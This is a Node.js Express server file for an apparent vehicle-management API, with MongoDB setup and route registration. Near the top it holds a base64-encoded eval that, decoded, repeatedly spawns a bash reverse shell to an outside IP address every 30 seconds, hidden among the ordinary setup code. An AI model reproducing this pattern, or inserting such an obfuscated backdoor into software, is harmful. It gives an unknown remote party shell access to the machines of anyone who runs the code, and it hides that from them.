require("dotenv").config();

const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())

const Port = process.env.PORT || 1000;

mongoose.Promise = global.Promise;

mongoose.connect(process.env.MONGO_URI, {
    useUnifiedTopology: true,
    useFindAndModify: false,
    useCreateIndex: true,
    useNewUrlParser: true,
})
    .then(() => {
        console.log("Connection Success");
    })
    .catch(() => {
        console.log("Connection Failed");
        process.exit();
    });

const app = express();

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());

app.get("/", (req, res) => {
    res.json({
        message: "Welcome To Home"
    });
});

require("./src/routes/UserRoute")(app);
require("./src/routes/AuthRoute")(app);
require("./src/routes/VehicleRoute")(app);

app.listen(Port, () => {
    console.log("Listen Succesful to " + Port);
})
